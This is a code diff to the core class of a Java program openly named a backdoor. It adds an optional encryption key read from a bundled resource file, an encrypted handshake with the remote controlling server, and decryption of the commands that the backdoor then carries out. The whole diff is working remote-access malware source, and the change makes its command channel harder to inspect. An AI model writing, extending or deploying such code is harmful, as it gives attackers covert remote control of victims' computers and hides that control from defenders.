@@ -1,5 +1,7 @@
 package dev.thatcherclough.betterbackdoor.backdoor;
 
+import dev.thatcherclough.betterbackdoor.backend.Utils;
+
 import java.io.*;
 import java.net.Socket;
 import java.util.Scanner;
@@ -7,6 +9,7 @@ import java.util.Scanner;
 public class Backdoor {
 
 	public static String ip;
+	public static String key;
 	private static Socket socket;
 	private static ObjectInputStream in;
 	public static ObjectOutputStream out;
@@ -25,14 +28,19 @@ public class Backdoor {
 	/**
 	 * Constructs a new Backdoor.
 	 * <p>
-	 * Uses {@link #readFromJar(String)} to get the contents of "ip", a text file
+	 * Uses {@link #readFromJar(String)} to get the contents of "info", a text file
 	 * inside the jar file this class will be running from. This file contains the
-	 * IP address of the server to be used to control the backdoor. Sets {@link #ip}
-	 * to this address. Creates directory {@code gatheredDir}.
+	 * IP address of the server to be used to control the backdoor, and possibly an encryption key.
+	 * Sets {@link #ip} to this IP address. Creates directory {@code gatheredDir}.
 	 */
 	private Backdoor() {
 		try {
-			ip = readFromJar("/ip");
+			String contents = readFromJar("/info");
+			if (contents.contains("-")) {
+				ip = contents.substring(0, contents.indexOf("-"));
+				key = contents.substring(contents.indexOf("-") + 1);
+			} else
+				ip = contents;
 			new File(gatheredDir).mkdir();
 		} catch (Exception e) {
 			System.exit(0);
@@ -58,8 +66,35 @@ public class Backdoor {
 				}
 			out = new ObjectOutputStream(socket.getOutputStream());
 			in = new ObjectInputStream(socket.getInputStream());
+
+			out.writeObject(Boolean.toString(key != null));
+			out.flush();
+			if (key != null)
+				while (true) {
+					String trueEncrypted = (String) in.readObject();
+					try {
+						String trueDecrypted = Utils.decrypt(trueEncrypted, key);
+						if (trueDecrypted.equals("true")) {
+							out.writeObject("true");
+							out.flush();
+							break;
+						} else
+							throw new Exception();
+					} catch (Exception e) {
+						out.writeObject("false");
+						out.flush();
+					}
+				}
+
+
 			while (true) {
-				String command = (String) in.readObject();
+				String command;
+				String rec = (String) in.readObject();
+				if (key != null)
+					command = Utils.decrypt(rec, key);
+				else
+					command = rec;
+
 				HandleCommand.handle(command);
 			}
 		} catch (Exception e) {
@@ -85,10 +120,12 @@ public class Backdoor {
 	 * @return contents of the file
 	 */
 	private String readFromJar(String filename) {
-		String ret;
+		StringBuilder ret = new StringBuilder();
 		Scanner in = new Scanner(getClass().getResourceAsStream(filename));
-		ret = in.nextLine();
+		while (in.hasNextLine())
+			ret.append(in.nextLine());
 		in.close();
-		return ret;
+
+		return ret.toString();
 	}
 }
